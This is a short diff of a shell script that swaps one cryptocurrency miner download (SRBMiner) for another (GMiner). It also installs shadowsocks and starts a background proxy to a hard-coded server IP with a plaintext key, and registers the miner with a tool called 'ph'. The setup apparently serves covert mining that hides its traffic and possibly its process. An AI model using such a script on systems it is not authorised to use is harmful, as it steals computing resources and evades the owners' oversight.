@@ -31,11 +31,11 @@ sleep .2
 echo " "
 echo " "
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
-tar -xf SRBMiner-Multi-0-7-6-Linux.tar.xz
+wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz
+tar -xf gminer_3_03_linux64.tar.xz
 
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
-ph add SRBMiner-MULTI
+ph add miner
